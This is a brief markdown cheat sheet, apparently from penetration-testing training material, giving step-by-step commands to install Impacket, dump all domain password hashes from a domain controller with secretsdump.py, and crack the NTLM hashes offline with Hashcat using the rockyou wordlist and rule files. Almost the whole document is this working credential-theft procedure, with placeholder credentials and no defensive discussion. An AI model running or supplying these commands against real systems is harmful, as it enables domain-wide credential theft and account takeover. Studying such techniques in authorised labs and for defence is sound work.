---
legal-banner: true
---

### **Using Impacket secretsdump.py**

1. Update the package list:  
   ```bash
   sudo apt-get update
   ```

2. Install Python3-pip:  
   ```bash
   sudo apt-get install python3-pip
   ```

3. Install Impacket:  
   ```bash
   pip3 install impacket
   ```

4. Extract hashes from the Domain Controller:  
   ```bash
   secretsdump.py -outputfile inlanefreight_hashes -just-dc EXAMPLE/[USERNAME]:[PASSWORD]@[IP_ADDRESS]
   ```

5. Install Hashcat:  
   ```bash
   sudo apt-get install hashcat
   ```

6. Crack NTLM hashes with Hashcat:  
   ```bash
   hashcat -m 1000 -a 0 example_hashes.ntds /usr/share/wordlists/rockyou.txt
   ```
   ```bash
   hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
   ```